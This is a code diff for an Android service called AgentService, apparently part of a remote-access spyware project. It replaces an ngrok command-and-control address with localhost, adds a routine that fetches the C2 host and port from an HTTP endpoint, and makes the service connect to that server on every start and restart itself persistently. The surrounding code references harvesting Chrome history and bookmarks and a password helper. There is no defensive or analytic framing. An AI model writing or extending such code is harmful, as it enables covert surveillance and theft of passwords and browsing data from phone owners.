@@ -127,8 +127,8 @@ import androidx.annotation.NonNull;
 import java.net.URI;
 public class AgentService extends Service implements LifecycleOwner {
     private static final String TAG = "LazyFramework";
-    private static String C2_HOST = "2.tcp.ngrok.io";
-    private static int C2_PORT = 25375;
+    private static String C2_HOST = "localhost";
+    private static int C2_PORT = 5000;
     private static final String CHANNEL_ID = "agent_channel";
 
     // ==================== SOCKET ====================
@@ -237,6 +237,38 @@ private static final int MAX_LOCATION_HISTORY = 500;
     // Browser history & bookmarks
     private static final String BROWSER_HISTORY_URI = "content://com.android.chrome.browser/history";
     private static final String BROWSER_BOOKMARKS_URI = "content://com.android.chrome.browser/bookmarks";
+    
+private void fetchC2Config() {
+    new Thread(() -> {
+        try {
+            String url = "http://localhost:8080/api/c2";
+            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(5000);
+            
+            if (conn.getResponseCode() == 200) {
+                BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(conn.getInputStream())
+                );
+                StringBuilder response = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    response.append(line);
+                }
+                
+                JSONObject json = new JSONObject(response.toString());
+                C2_HOST = json.getString("host");
+                C2_PORT = json.getInt("port");
+                
+                Log.d(TAG, "✅ C2 Config: " + C2_HOST + ":" + C2_PORT);
+            }
+            conn.disconnect();
+        } catch (Exception e) {
+            Log.e(TAG, "Fetch config error: " + e.getMessage());
+        }
+    }).start();
+}    
+
 private PasswordHelper passwordHelper;
     @Override
     public void onCreate() {
@@ -5195,6 +5227,17 @@ private String extractDomain(String url) {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+    fetchC2Config();
+    
+    // Wait sebentar
+    try {
+        Thread.sleep(2000);
+    } catch (InterruptedException e) {
+        e.printStackTrace();
+    }
+    
+    // Then connect
+    connectToC2();
         return START_STICKY;
     }
 
